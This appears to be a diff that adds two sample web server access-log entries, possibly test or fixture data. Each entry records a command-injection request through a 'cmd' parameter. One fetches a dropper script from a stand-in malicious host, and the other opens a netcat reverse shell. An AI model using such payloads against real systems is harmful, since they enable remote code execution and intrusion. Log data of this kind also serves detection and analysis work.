@@ -1,0 +1,2 @@
+198.51.100.40 - - [19/Jul/2026:12:00:00 +0000] "GET /index.php?cmd=curl%20http://malicious.example/dropper.sh HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+198.51.100.41 - - [19/Jul/2026:12:01:00 +0000] "GET /cgi-bin/test.cgi?cmd=nc%20-e%20/bin/sh%20198.51.100.50%204444 HTTP/1.1" 500 128 "-" "curl/8.0"
